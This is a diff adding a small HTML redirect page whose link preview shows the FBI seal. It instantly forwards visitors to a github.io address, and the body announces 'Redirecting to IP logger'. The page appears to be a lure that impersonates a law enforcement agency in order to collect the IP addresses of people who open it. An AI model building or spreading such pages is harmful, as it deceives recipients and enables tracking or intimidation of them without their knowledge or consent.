@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta property="og:image" content="https://kokotzkanala.github.io/TBO-2.0-Ui/FBI_logo_Seal_of_the_Federal_Bureau_of_Investigation-2264216785.png" />
+  <meta http-equiv="refresh" content="0; url=https://kokotzkanala.github.io/TBO-2.0-Ui/?v=1" />
+  <title>Redirecting...</title>
+</head>
+<body>
+  Redirecting to IP logger...
+</body>
+</html>
